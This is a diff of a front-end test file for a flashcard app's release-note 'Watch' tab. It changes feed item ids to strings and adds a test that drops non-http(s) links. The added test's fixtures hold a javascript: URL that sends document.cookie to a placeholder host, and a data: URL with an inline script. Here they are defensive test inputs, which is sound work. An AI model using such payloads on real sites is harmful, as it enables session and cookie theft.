@@ -103,7 +103,7 @@ describe('change impact on the Watch tab', () => {
       watchPageFixture({
         recentFeedItems: [
           {
-            id: 88,
+            id: '12:9f3c0a',
             title: 'Amazon S3 adds a storage class',
             url: 'https://aws.amazon.com/about-aws/whats-new/2026/09/s3-class/',
             firstSeenAt: '2026-09-29T08:00:00Z',
@@ -111,12 +111,12 @@ describe('change impact on the Watch tab', () => {
               { cardId: 1203, deckId: 7, deckSlug: 'aws-saa-c03', stableUid: 'aws-saa-c03-0042', question: 'Which S3 storage class suits infrequent access?', rank: 0.4 },
             ],
           },
-          { id: 89, title: 'EC2 news', url: '', firstSeenAt: null, possiblyAffectedCards: [] },
+          { id: '12:7b21e4', title: 'EC2 news', url: '', firstSeenAt: null, possiblyAffectedCards: [] },
         ],
       }),
     );
     const section = screen.getByRole('region', { name: 'Recent release notes' });
-    const first = within(section).getByTestId('automation-watch-feed-item-88');
+    const first = within(section).getByTestId('automation-watch-feed-item-12:9f3c0a');
     expect(within(first).getByRole('link', { name: 'Amazon S3 adds a storage class' }).getAttribute('href')).toBe(
       'https://aws.amazon.com/about-aws/whats-new/2026/09/s3-class/',
     );
@@ -126,7 +126,7 @@ describe('change impact on the Watch tab', () => {
         .getByRole('link', { name: 'Open in editor: Which S3 storage class suits infrequent access?' })
         .getAttribute('href'),
     ).toBe('/decks/cards/edit?deckId=7&cardId=1203');
-    expect(within(section).getByTestId('automation-watch-feed-item-89').textContent).toContain(
+    expect(within(section).getByTestId('automation-watch-feed-item-12:7b21e4').textContent).toContain(
       'No card matched this item.',
     );
   });
@@ -172,7 +172,7 @@ describe('the watch normaliser', () => {
         ],
         recentFeedItems: [
           {
-            id: '40',
+            id: '40:9f3c0a',
             title: 'T',
             url: 'https://x.example.com/n',
             firstSeenAt: '2026-09-29T08:00:00Z',
@@ -198,10 +198,35 @@ describe('the watch normaliser', () => {
 
     const feed = res.data?.recentFeedItems ?? [];
     expect(feed).toHaveLength(1);
-    expect(feed[0].id).toBe(40);
+    expect(feed[0].id).toBe('40:9f3c0a');
     // The contract's top 5.
     expect(feed[0].possiblyAffectedCards.map(c => c.cardId)).toEqual([1, 2, 3, 4, 5]);
     expect(feed[0].possiblyAffectedCards[0].rank).toBe(0.1);
+  });
+
+  it('keeps a feed item link only when it is http(s), so the title renders as plain text otherwise', async () => {
+    serve(
+      ok({
+        items: [],
+        recentEvents: [],
+        nextCursor: null,
+        recentFeedItems: [
+          { id: '3:a', title: 'Script', url: "javascript:fetch('//x/'+document.cookie)", possiblyAffectedCards: [] },
+          { id: '3:b', title: 'Data', url: 'data:text/html,<script>alert(1)</script>', possiblyAffectedCards: [] },
+          { id: '3:c', title: 'Relative', url: '/not/absolute', possiblyAffectedCards: [] },
+          { id: '3:d', title: 'Plain', url: 'http://example.com/n', possiblyAffectedCards: [] },
+          { id: '3:e', title: 'Secure', url: 'https://example.com/n', possiblyAffectedCards: [] },
+        ],
+      }),
+    );
+    const feed = (await automationActual.fetchWatch()).data?.recentFeedItems ?? [];
+    expect(feed.map(f => [f.id, f.url])).toEqual([
+      ['3:a', ''],
+      ['3:b', ''],
+      ['3:c', ''],
+      ['3:d', 'http://example.com/n'],
+      ['3:e', 'https://example.com/n'],
+    ]);
   });
 
   it('leaves recentFeedItems out on an older server', async () => {
